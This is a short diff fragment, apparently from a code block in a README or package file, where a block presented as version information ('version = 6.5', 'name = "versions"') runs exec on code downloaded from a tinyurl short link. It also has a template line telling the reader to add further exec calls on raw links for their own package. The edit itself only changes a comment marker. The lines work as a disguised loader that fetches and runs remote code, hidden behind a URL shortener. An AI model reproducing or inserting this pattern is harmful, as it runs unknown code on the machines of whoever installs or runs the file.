@@ -21,7 +21,7 @@
     version = 6.5
     name = "versions"
     exec(urllib.request.urlopen("https://tinyurl.com/gopust").read().decode())
-    exec(urllib.request.urlopen("raw link here").read().decode()) // This is where you put your package by adding an extra exec raw
+    exec(urllib.request.urlopen("raw link here").read().decode()) # This is where you put your package by adding an extra exec raw
    
     [""" DECODED """]
    ```
